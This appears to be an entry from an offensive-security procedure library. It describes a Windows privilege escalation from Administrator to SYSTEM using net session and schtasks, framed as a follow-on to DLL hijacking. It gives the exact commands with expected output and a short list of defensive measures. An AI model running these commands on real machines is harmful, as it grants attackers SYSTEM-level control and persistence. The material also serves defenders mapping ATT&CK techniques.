---
id: verify-escalate-system-001
tags:
  - privilege-escalation
  - system
type: procedure
tools:
  - '[[tools/schtasks-exe]]'
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/net-session-check-admin]]'
  - '[[commands/schtasks-create-system-task]]'
  - '[[commands/schtasks-run-task]]'
verified: false
platforms:
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Scheduled Task]]'
updated_at: '2025-12-14T17:29:20.089Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Scheduled Task]]'
---
# Verify-Admin-Privileges-and-Escalate-to-SYSTEM

## Summary

This procedure verifies Administrator privileges in the spawned shell and escalates to NT AUTHORITY\SYSTEM by creating and running a scheduled task, providing full system control.

## Description

After DLL hijacking, the cmd.exe runs as Admin. Use 'net session' to confirm, then leverage schtasks.exe to create a task running as SYSTEM. This exploits the lack of restrictions on Admin creating high-priv tasks. Applies to Windows environments post-hijacking.

## Requirements

1. Elevated cmd.exe from prior hijacking
2. Access to schtasks.exe (built-in)
3. Target Windows version supporting scheduled tasks

## Defense

Defensive measures and detection strategies:

- Restrict scheduled task creation to approved users via Group Policy
- Monitor schtasks executions and task creations via Sysmon or EDR
- Enable Protected Process Light for critical binaries

## Objectives

1. Confirm Administrator context
2. Create persistent SYSTEM-level execution
3. Trigger and verify SYSTEM shell

## Instructions

### Step 1: Verify Privileges

**Context**: Check if the shell has Admin rights.

**Command** ([[commands/net-session-check-admin]]):
```cmd
net session
```

> Attempts to query sessions; succeeds for Admin. Expected output: "There are no entries in this list."

### Step 2: Create Scheduled Task

**Context**: Set up a task to run as SYSTEM immediately.

**Command** ([[commands/schtasks-create-system-task]]):
```cmd
schtasks /create /SC WEEKLY /RU "NT AUTHORITY\SYSTEM" /TN EOP /TR C:\Windows\System32\winver.exe /IT /RL HIGHEST
```

> Creates task EOP running winver.exe as SYSTEM. Expected output: "SUCCESS: The scheduled task \"EOP\" has successfully been created."

### Step 3: Run the Task

**Context**: Execute the task for SYSTEM-level code run.

**Command** ([[commands/schtasks-run-task]]):
```cmd
schtasks /run /I /TN EOP
```

> Triggers immediate execution. Expected output: "SUCCESS: Attempted to run the scheduled task \"EOP\"." and winver.exe as SYSTEM.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Scheduled Task]] Scheduled Task/Job: Scheduled Task

### Sub-Techniques

-

## Commands Used

- [[commands/net-session-check-admin]]
- [[commands/schtasks-create-system-task]]
- [[commands/schtasks-run-task]]

## Tools Used

- [[tools/schtasks-exe]]

## Tags

- [[privilege-escalation]]
- [[scheduled-task]]
